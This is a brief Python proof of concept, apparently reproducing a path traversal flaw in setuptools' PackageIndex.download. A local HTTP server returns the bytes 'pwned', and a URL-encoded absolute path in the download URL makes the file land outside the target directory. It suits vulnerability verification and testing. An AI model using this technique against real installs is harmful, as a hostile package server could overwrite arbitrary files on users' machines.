import http.server, os, tempfile, threading, urllib.parse
from setuptools.package_index import PackageIndex

class H(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200); self.send_header("Content-Type", "application/octet-stream"); self.end_headers()
        self.wfile.write(b"pwned")
    def log_message(self, *a): pass

srv = http.server.HTTPServer(("127.0.0.1", 0), H)
threading.Thread(target=srv.serve_forever, daemon=True).start()

tmpdir = tempfile.mkdtemp()
victim = os.path.join(tempfile.mkdtemp(), "victim.tar.gz")
url = f"http://127.0.0.1:{srv.server_port}/pkg/{urllib.parse.quote(victim, safe='')}"
result = PackageIndex().download(url, tmpdir)
print(result, open(victim).read(), result.startswith(tmpdir))
